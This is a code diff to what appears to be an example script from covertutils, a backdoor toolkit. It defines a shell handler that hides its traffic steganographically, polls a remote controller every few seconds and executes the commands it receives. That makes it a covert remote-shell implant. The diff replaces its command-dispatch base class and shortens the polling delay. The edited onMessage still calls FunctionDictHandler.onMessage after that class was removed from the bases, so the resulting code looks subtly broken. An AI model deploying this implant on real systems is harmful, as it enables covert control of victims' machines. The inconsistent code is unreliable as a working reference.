@@ -9,9 +9,9 @@
 # the concept of 'StegoOrchestrator' class and network wrapper functions
 
 from covertutils.handlers import InterrogatingHandler, FunctionDictHandler
+from covertutils.handlers.impl import SimpleShellHandler
 from covertutils.orchestration import StegoOrchestrator
 from covertutils.datamanipulation import asciiToHexTemplate
-from covertutils.payloads import CommonStages
 
 from os import urandom
 from time import sleep
@@ -66,18 +66,19 @@ req = """%s"""
 #============================== Handler Overriding part ===================
 
 # Making a dict to map every 'stream' to a function to be called with the message as argument
-_function_dict = { 'control' : CommonStages['shell']['function'], 'main' : CommonStages['shell']['function'] }
+# _function_dict = { 'control' : CommonStages['shell']['function'], 'main' : CommonStages['shell']['function'] }
 
 # We need a handler that will ask for and deliver data, initiating a communication once every 2-3 seconds.
 # This behavior is modelled in the 'InterrogatingHandler' with the 'delay_between' argument.
 # The 'FunctionDictHandler' automatically runs all messages through function found in a given dict
-class ShellHandler ( InterrogatingHandler, FunctionDictHandler ) :
+class ShellHandler ( InterrogatingHandler, SimpleShellHandler ) :
 
 	def __init__( self, recv, send, orch ) :
 		super( ShellHandler, self ).__init__( recv, send, orch, # basic handler arguments
 											fetch_stream = 'main',	# argument from 'InterrogatingHandler'
-											function_dict = _function_dict, # argument from 'FunctionDictHandler'
-											delay_between = (2, 3)	 # argument from 'InterrogatingHandler'
+											# function_dict = _function_dict, # argument from 'FunctionDictHandler'
+											delay_between = (0.0, 4),	 # argument from 'InterrogatingHandler'
+											# delay_between = (2, 3)	 # argument from 'InterrogatingHandler'
 											)	# The arguments will find their corresponding class and update the default values
 
 	def onChunk( self, stream, message ) : pass		# If a part of a message arrives - do nothing.
@@ -85,7 +86,7 @@ class ShellHandler ( InterrogatingHandler, FunctionDictHandler ) :
 	def onMessage( self, stream, message ) :		# If a message arrives
 
 		if message != 'X' :								# If message is not the 'no data available' flag
-			stream, output = FunctionDictHandler.onMessage( self, stream, message )	# Run the received message
+			output = FunctionDictHandler.onMessage( self, stream, message )	# Run the received message
 																				#through the corresponding function
 			# stream, message = super( ShellHandler, self ).onMessage( stream, message )	# Run
 
